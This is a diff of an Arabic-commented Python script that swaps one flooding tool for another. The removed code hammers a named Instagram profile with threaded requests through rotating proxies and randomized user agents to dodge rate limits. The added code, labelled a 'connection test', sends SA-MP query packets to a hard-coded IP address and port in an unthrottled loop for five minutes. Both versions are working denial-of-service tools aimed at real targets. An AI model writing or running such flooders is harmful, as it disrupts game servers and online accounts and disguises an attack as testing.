@@ -1,79 +1,32 @@
-import requests
-import random
-import threading
+import socket
 import time
 
-# =====================================================================
-# === TRAPKING INSTAGRAM TARGETED SCRIPT FOR PIXELHELPER ===
-# =====================================================================
+# حدد البيانات
+TARGET_IP = "193.111.250.244"  # استبدله بـ IP الهدف
+TARGET_PORT = 7057        # استبدله بمنفذ السيرفر
+DURATION = 300              # مدة الاختبار بالثواني
 
-TARGET_URL = "https://www.instagram.com/pixelhelper/"  # الحساب المستهدف[span_1](start_span)[span_1](end_span)
-DURATION = 60                          # مدة التشغيل بالثواني
-THREADS_COUNT = 20                     # عدد الخيوط المتوازية
-
-# ضع هنا قائمة البروكسيات الحقيقية بصيغة http://IP:PORT
-PROXIES_LIST = [
-    # مثال: "http://123.45.67.89:8080",
-    # مثال: "http://98.76.54.32:3128"
-]
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15"
-]
-
-def target_worker():
+def test_connection():
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # حزمة استعلام SAMP بسيطة (Info Query)
+    payload = b'SAMP' + socket.inet_aton(TARGET_IP)[:900] + int(TARGET_PORT).to_bytes(2, 'little') + b'i'
+    
     end_time = time.time() + DURATION
+    count = 0
     
-    while time.time() < end_time:
-        try:
-            # ترويسة عشوائية لتجنب البصمة الثابتة
-            headers = {
-                "User-Agent": random.choice(USER_AGENTS),
-                "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
-                "Cache-Control": "no-cache"
-            }
-            
-            # اختيار بروكسي عشوائي إن وجد في القائمة
-            proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
-            proxies = {"http": proxy, "https": proxy} if proxy else None
-            
-            # تنفيذ الطلب نحو البروفايل المستهدف
-            response = requests.get(TARGET_URL, headers=headers, proxies=proxies, timeout=5)
-            
-            if response.status_code == 200:
-                print(f"[+] تم إرسال الطلب بنجاح عبر البروكسي: {proxy} | الحالة: 200")
-            elif response.status_code == 429:
-                print(f"[!] تم رصد الطلبات (Rate Limit) عبر البروكسي: {proxy}")
-            else:
-                print(f"[-] استجابة أخرى من السيرفر: {response.status_code}")
-                
-        except Exception:
-            # تجاوز أخطاء الاتصال أو انقطاع البروكسي لضمان استمرار الـ Loop
-            pass
-            
-        time.sleep(0.5)
-
-def main():
-    print(f"[*] === بدء تشغيل السكود الأسطوري نحو الحساب: {TARGET_URL} ===")
+    print(f"جاري اختبار الاتصال مع {TARGET_IP}:{TARGET_PORT}...")
     
-    if not PROXIES_LIST:
-        print("[!] تنبيه: قائمة البروكسيات فارغة! يفضل إضافة بروكسيات حقيقية لضمان تنوع عناوين الـ IP.")
-    
-    print(f"[*] تشغيل {THREADS_COUNT} خيط متزامن عبر الـ VPS...")
-    
-    threads = []
-    for _ in range(THREADS_COUNT):
-        t = threading.Thread(target=target_worker)
-        threads.append(t)
-        t.start()
-        
-    for t in threads:
-        t.join()
-        
-    print("\n[+] انتهت الجلسة البرمجية بنجاح يا أسطورة.")
+    try:
+        while time.time() < end_time:
+            client.sendto(payload, (TARGET_IP, TARGET_PORT))
+            count += 1
+    except Exception as e:
+        print(f"حدث خطأ: {e}")
+    finally:
+        client.close()
+        print(f"تم إرسال {count} حزمة استعلام.")
 
 if __name__ == "__main__":
-    main()
+    test_connection()
+    
